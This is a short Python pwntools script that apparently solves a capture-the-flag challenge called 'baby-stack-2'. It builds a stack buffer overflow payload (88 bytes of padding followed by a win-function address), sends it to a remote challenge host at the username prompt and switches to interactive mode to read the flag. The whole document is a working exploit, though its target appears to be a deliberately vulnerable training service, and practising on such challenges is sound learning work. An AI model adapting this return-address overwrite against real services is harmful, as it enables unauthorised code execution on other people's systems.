from pwn import *

# Offset to the return address
OFFSET = 88

# Address of the win function (from GDB: info functions)
WIN_FUNCTION_ADDRESS = 0x000000000040129b

# Target details
HOST = 'cyberskills.ch'
PORT = 5000

# Connect to the target
# For local testing, you would use:
# target = process('./baby-stack-2')
# gdb.attach(target) # If you want to debug locally
target = remote(HOST, PORT)

# Craft the payload
# 'A' * OFFSET fills the buffer up to the return address
# p64(WIN_FUNCTION_ADDRESS) is the 64-bit address of our win function, in little-endian format
payload = b'A' * OFFSET + p64(WIN_FUNCTION_ADDRESS)

log.info(f"Calculated offset: {OFFSET}")
log.info(f"Win function address: {hex(WIN_FUNCTION_ADDRESS)}")
log.info(f"Payload ({len(payload)} bytes): {payload}")

# Wait for the "Username: " prompt
line = target.recvuntil(b"Username: ")
log.info(f"Received: {line.decode().strip()}")

# Send the payload
log.info("Sending payload...")
target.sendline(payload)

# Go interactive to see the output (hopefully the flag!)
log.info("Switching to interactive mode...")
target.interactive() 
